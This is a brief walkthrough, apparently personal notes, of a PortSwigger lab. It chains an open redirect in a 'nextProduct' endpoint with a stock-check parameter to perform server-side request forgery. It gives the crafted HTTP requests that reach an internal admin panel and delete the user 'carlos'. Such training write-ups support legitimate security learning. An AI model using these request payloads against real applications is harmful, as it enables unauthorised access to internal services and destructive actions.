# [Lab: SSRF with filter bypass via open redirection vulnerability](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)

## Lab

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://192.168.0.12:8080/admin` and delete the user `carlos`.

The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first.

## Analysis

stockApi:

  ```http
  POST /product/stock HTTP/1.1

  stockApi=/product/stock/check%3fproductId%3d13%26storeId%3d1
  ```

- stockApi only accept local path

Detected Open redirect at `Next Product` button:

  ```http
  GET /product/nextProduct?currentProductId=13&path=/product?productId=14 HTTP/1.1
  ```

## Exploit

use open redirect vulnerability to bypass ssrf prevention:

  ```http
  POST /product/stock HTTP/1.1

  stockApi=/product/nextProduct%3fcurrentProductId%3d13%26path%3dhttp%3a//192.168.0.12%3a8080/admin
  ```

- this make the redirection happened on the server-side
- result: admin panel returned

delete carlos account:

  ```http
  POST /product/stock HTTP/1.1

  stockApi=/product/nextProduct%3fcurrentProductId%3d13%26path%3dhttp%3a//192.168.0.12%3a8080/admin/delete%3fusername%3dcarlos
  ```

solved
